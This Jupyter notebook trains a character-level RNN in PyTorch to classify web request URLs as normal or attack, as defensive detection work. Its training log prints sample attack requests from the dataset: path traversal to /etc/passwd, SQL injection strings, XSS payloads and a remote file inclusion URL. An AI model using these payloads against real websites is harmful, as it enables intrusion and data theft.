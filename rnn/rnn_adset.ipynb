{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "import torch\n",
    "import string\n",
    "from torch.utils.data import Dataset, DataLoader, random_split\n",
    "import matplotlib.pyplot as plt\n",
    "from tqdm import tqdm\n",
    "from IPython.display import clear_output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_categories = [\"normal\", \"attack\"]\n",
    "n_categories = len(all_categories)\n",
    "category_lines = {}\n",
    "\n",
    "PATH_NORMAL = \"dataset/normal.txt\"\n",
    "PATH_ATTACK = \"dataset/attack.txt\"\n",
    "\n",
    "def readLines(filename: str) -> list[str]:\n",
    "    lines = open(filename, encoding=\"utf-8\").read().strip().split(\"\\n\")\n",
    "    return lines\n",
    "\n",
    "def removeBlankLines(file_path: str) -> None:\n",
    "    with open(file_path, 'r') as f:\n",
    "        lines = [line for line in f if line.strip()]\n",
    "\n",
    "    with open(file_path, 'w') as f:\n",
    "        f.writelines(lines)\n",
    "\n",
    "removeBlankLines(PATH_NORMAL)\n",
    "removeBlankLines(PATH_ATTACK)\n",
    "lines_normal = readLines(PATH_NORMAL)  # list_of_normal\n",
    "lines_attack = readLines(PATH_ATTACK)  # list_of_attack\n",
    "lines_all = lines_normal + lines_attack\n",
    "\n",
    "category_lines[\"normal\"] = lines_normal\n",
    "category_lines[\"attack\"] = lines_attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_char = string.printable\n",
    "n_all_char = len(all_char)\n",
    "\n",
    "\n",
    "def char2index(char: str):\n",
    "    return all_char.find(char)\n",
    "\n",
    "\n",
    "def char2tensor(char: str):\n",
    "    tensor = torch.zeros(1, n_all_char)\n",
    "    tensor[0][char2index(char)] = 1\n",
    "    return tensor\n",
    "\n",
    "\n",
    "def line2tensor(line: str):\n",
    "    tensor = torch.zeros(len(line), n_all_char)\n",
    "    for i, char in enumerate(line):\n",
    "        tensor[i][char2index(char)] = 1\n",
    "    return tensor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "class URLDataset(Dataset):\n",
    "    def __init__(self, lines_normal, lines_attack, lines_all):\n",
    "        self.len = len(lines_normal) + len(lines_attack)\n",
    "        self.normal_tensor = torch.zeros((len(lines_normal)), dtype=torch.long)\n",
    "        self.attack_tensor = torch.ones(len(lines_attack), dtype=torch.long)\n",
    "        self.x_data = [line2tensor(line) for line in tqdm(lines_all)]\n",
    "        self.x_raw = lines_all\n",
    "        self.y_data = torch.cat((self.normal_tensor, self.attack_tensor), dim=0)\n",
    "\n",
    "    def __getitem__(self, index):\n",
    "        return self.x_data[index], self.y_data[index], self.x_raw[index]\n",
    "\n",
    "    def __len__(self):\n",
    "        return self.len\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 79046/79046 [00:14<00:00, 5342.96it/s] \n"
     ]
    }
   ],
   "source": [
    "dataset = URLDataset(lines_normal, lines_attack, lines_all)\n",
    "train_dataset, test_dataset = random_split(dataset, lengths=[0.6, 0.4])\n",
    "train_size = len(train_dataset)\n",
    "test_size = len(test_dataset)\n",
    "train_loader = DataLoader(dataset=train_dataset, shuffle=True, num_workers=0)\n",
    "test_loader = DataLoader(dataset=test_dataset, shuffle=True, num_workers=0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "def categoryFromOutput(output):\n",
    "    top_n, top_i = output.topk(1)\n",
    "    category_i = top_i[0].item()\n",
    "    return all_categories[category_i], category_i"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "class RNN(torch.nn.Module):\n",
    "    def __init__(self, input_size, hidden_size, output_size, num_layers):\n",
    "        super().__init__()\n",
    "\n",
    "        self.num_layers = num_layers\n",
    "        self.input_size = input_size\n",
    "        self.hidden_size = hidden_size\n",
    "        self.rnn = torch.nn.RNN(\n",
    "            input_size=self.input_size,\n",
    "            hidden_size=self.hidden_size,\n",
    "            num_layers=num_layers,\n",
    "        )\n",
    "        self.h2o = torch.nn.Linear(hidden_size, output_size)\n",
    "\n",
    "    def forward(self, input):\n",
    "        hidden = torch.zeros(self.num_layers, self.hidden_size)\n",
    "        input, _ = self.rnn(input, hidden)\n",
    "        output = self.h2o(input[-1, :])\n",
    "        return output.unsqueeze(0)\n",
    "\n",
    "\n",
    "input_size = n_all_char\n",
    "output_size = 2\n",
    "hidden_size = 128\n",
    "num_layers = 2\n",
    "learning_rate = 0.00008\n",
    "rnn = RNN(input_size, hidden_size, output_size, num_layers)\n",
    "\n",
    "criterion = torch.nn.CrossEntropyLoss()\n",
    "optimizer = torch.optim.Adam(rnn.parameters(), lr=learning_rate)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "epoch=1 iter=5000 0.05271% 0.29925 attack YES /wdb-description/                              \n",
      "epoch=1 iter=10000 0.10542% 0.00039 attack YES /scripts/save.php?file_save=/etc/passwd       \n",
      "epoch=1 iter=15000 0.15813% 0.08496 normal YES /config.rb                                     \n",
      "epoch=1 iter=20000 0.21085% 0.00131 attack YES /examples/servlets/servlet/perl.exe?-v         \n",
      "epoch=1 iter=25000 0.26356% 0.20768 normal YES /revision.txt                                  \n",
      "epoch=1 iter=30000 0.31627% 0.00021 attack YES /phpdebug_PATH/test/debug_test.php?debugClassLocation=XXpathXX\n",
      "epoch=1 iter=35000 0.36898% 0.01521 attack YES /2017/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%20onmonmouseoverouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363\n",
      "epoch=1 iter=40000 0.42169% 0.00040 attack YES /myhome/space.php?id=-9828%27%29%20OR%20%28SELECT%208896%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a636b663a%2C%28SELECT%20%28CASE%20WHEN%20%288896%3D8896%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a74636d3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20%20AND%20%28%27pgVe%27%3D%27pgVe\n",
      "epoch=1 iter=45000 0.47440% 0.00589 normal YES /manage/admin/admin                            \n",
      "Epoch [1/2]: 100%|██████████| 47428/47428 [04:30<00:00, 175.54it/s, loss=0.000859, acc=96.605]\n",
      "TEST: 100%|██████████| 31618/31618 [00:29<00:00, 1073.29it/s]\n",
      "Test set: Accuracy 31206 / 31618 98.70 %\n",
      "epoch=2 iter=5000 0.55271% 0.00168 attack YES /regcheck.php?item=p%27%20AND%20%28SELECT%20%28CASE%20WHEN%20%288281%3D8281%29%20THEN%201%20ELSE%20%28SELECT%201%20FROM%20%28select%201%20union%20select%202%29x%29%20END%29%29--%20-&password=undefined&ajax_request=1488931246010\n",
      "epoch=2 iter=10000 0.60542% 0.00545 attack YES /addvip.php?msetstr[\"progsdir\"]=http://192.168.202.118:8080/moclyxlwqyfjnp?\n",
      "epoch=2 iter=15000 0.65813% 1.95466 normal NO (attack) /analysis/capture?userid=&type=ae3bae0cbe534dc7a3ed9e332606de18&url=http%3A%2F%2Fwww.yuecai.com%2Fpurchase%2FproDetail-1097879098283262418-TYCG170301006-b4702b4866b673bfed0664ad07eec19c-2-2.htm&title=2017%E5%B9%B43%E6%9C%881%E6%97%A5%E5%AE%9C%E5%AE%BE%E5%A4%A9%E5%8E%9F%E9%9B%86%E5%9B%A2%E5%85%AC%E5%8F%B8%E9%80%9A%E7%94%A8%E6%9D%90%E4%B8%80%E6%89%B9_%E5%95%86%E6%9C%BA%E5%B9%BF%E5%9C%BA_%E5%95%86%E6%9C%BA_%E5%95%86%E6%9C%BA%E9%A1%B9%E7%9B%AE_%E6%82%A6%E9%87%87&user-agent=Mozilla%2F5.0%20(Windows%20NT%205.1)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F45.0.2454.101%20Safari%2F537.36&referer=http%3A%2F%2Fhome.yuecai.com%2Findex.htm&element=a&info=id%3Abox_img%7Cname%3Anull%7Cclass%3Abox_img%20quotedPrice%7Ctitle%3A%7Chref%3Ajavascript%3A%3B%7CinnerHTML%3A%E7%AB%8B%E5%8D%B3%E6%8A%A5%E4%BB%B7%7Ctj_element%3Afalse&identifier=null&meta_keyword=none&meta_description=none&timestamp=1488934675061\n",
      "epoch=2 iter=20000 0.71085% 0.00668 normal YES /nimageb.asp                                   \n",
      "epoch=2 iter=25000 0.76356% 0.00232 normal YES /ba1jia.asp                                    \n",
      "epoch=2 iter=30000 0.81627% 0.00039 normal YES /wp-login.php?action=1492877913769             \n",
      "epoch=2 iter=35000 0.86898% 0.00199 normal YES /admin/default.aspx                            \n",
      "epoch=2 iter=40000 0.92169% 0.00012 attack YES /archiver/?tid-92.html='%3E%22%3E%3C/title%3E%3C/textarea%3E%3C/script%3E%3Cimg+src=a+onerror=alert(1)%3E\n",
      "epoch=2 iter=45000 0.97440% 0.00738 normal YES /adm_menu.asp                                  \n",
      "Epoch [2/2]: 100%|██████████| 47428/47428 [04:37<00:00, 171.08it/s, loss=0.000445, acc=98.535]\n",
      "TEST: 100%|██████████| 31618/31618 [00:29<00:00, 1076.56it/s]\n",
      "Test set: Accuracy 31349 / 31618 99.15 %\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 640x480 with 1 Axes>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "EPOCHS = 2\n",
    "print_every = 5000\n",
    "plot_every = 100\n",
    "\n",
    "plt.figure()\n",
    "all_losses = []\n",
    "\n",
    "def train(epoch):\n",
    "    total_loss = 0\n",
    "    current_loss = 0\n",
    "    num_correct = 0\n",
    "    bar = tqdm(enumerate(train_loader, start=1), total=train_size, file=sys.stdout)\n",
    "    bar.set_description(f\"Epoch [{epoch}/{EPOCHS}]\")\n",
    "    for iter, (line_tensor, category_tensor, line) in bar:\n",
    "        output = rnn(line_tensor[0])\n",
    "        loss = criterion(output, category_tensor)\n",
    "        optimizer.zero_grad()\n",
    "        loss.backward()\n",
    "        optimizer.step()\n",
    "        total_loss += loss.item()\n",
    "        current_loss += loss.item()\n",
    "        guess, guess_i = categoryFromOutput(output)\n",
    "        category_i = category_tensor.item()\n",
    "        num_correct += 1 if guess_i == category_i else 0\n",
    "        bar.set_postfix_str(\n",
    "            f\"loss={loss.item():.6f}, acc={(num_correct / iter * 100):.3f}\",\n",
    "            refresh=False,\n",
    "        )\n",
    "\n",
    "        if iter % print_every == 0:\n",
    "            guess, guess_i = categoryFromOutput(output)\n",
    "            category = all_categories[category_tensor.item()]\n",
    "            correct = \"YES\" if guess_i == category_i else f\"NO ({category})\"\n",
    "            tqdm.write(\n",
    "                f\"epoch={epoch} iter={iter} {(iter + (epoch - 1) * train_size) / (train_size * EPOCHS):.5f}% {loss:.5f} {guess} {correct} {line[0]}\"\n",
    "            )\n",
    "        \n",
    "        if iter % plot_every == 0:\n",
    "            all_losses.append(current_loss / plot_every)\n",
    "            current_loss = 0\n",
    "\n",
    "    return total_loss\n",
    "\n",
    "\n",
    "def test():\n",
    "    num_correct = 0\n",
    "    with torch.no_grad():\n",
    "        bar = tqdm(enumerate(test_loader, start=1), total=test_size, file=sys.stdout)\n",
    "        bar.set_description(\"TEST\")\n",
    "        for iter, (line_tensor, category_tensor, line) in bar:\n",
    "            output = rnn(line_tensor[0])\n",
    "            guess, guess_i = categoryFromOutput(output)\n",
    "            category_i = category_tensor.item()\n",
    "            num_correct += 1 if guess_i == category_i else 0\n",
    "        acc = num_correct / test_size * 100\n",
    "        print(f\"Test set: Accuracy {num_correct} / {test_size} {acc:.2f} %\")\n",
    "\n",
    "\n",
    "for epoch in range(1, EPOCHS + 1):\n",
    "    train(epoch)\n",
    "    test()\n",
    "    state = {\"state\": rnn.state_dict(), \"epoch\": iter}\n",
    "    filename = \"pt/\" + str(epoch * train_size) + \".pt\"\n",
    "    torch.save(state, filename)\n",
    "\n",
    "# clear_output(wait=True)\n",
    "plt.plot(all_losses)\n",
    "plt.show()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
